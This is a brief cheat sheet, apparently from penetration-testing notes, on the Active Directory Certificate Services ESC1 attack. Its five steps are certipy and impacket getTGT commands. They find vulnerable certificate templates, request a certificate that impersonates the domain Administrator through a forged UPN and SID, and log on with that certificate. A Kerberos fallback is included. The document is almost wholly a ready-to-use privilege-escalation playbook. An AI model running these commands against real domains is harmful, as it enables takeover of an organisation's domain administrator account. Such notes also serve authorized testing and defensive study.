# ADCS ESC1

%adcs, certificate, ActiveDirectory, template

## 1. Finding vulnerable template
```
certipy find -u <username> -p '<password>' -target <CA_FQDN> -vulnerable -stdout
```

## 2. Request a cert that impersonates Administrator
```
certipy req -u <username> -p '<password>' -target <CA_FQDN> -ca <CA_NAME> \
            -dc-ip <DC_IP> \
            -dc-host <DC_HOST> \
            -template <ESC1_TEMPLATE> \
            -upn 'administrator@<DOMAIN>' -sid <ADMIN_SID>
```

## 3. Log on with the minted cert
```
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
```

## 4. If password of hash fails:
```
getTGT.py <domain>/<username>:'<password>' -dc-ip <DC_IP>
```
## 5. Using Kerberos for certificate request.
```
certipy req -u <username> -k -target <CA_FQDN> -ca <CA_NAME> \
            -dc-ip <DC_IP> \
            -dc-host <DC_HOST> \
            -template <ESC1_TEMPLATE> \
            -upn 'administrator@<DOMAIN>' -sid <ADMIN_SID>
```
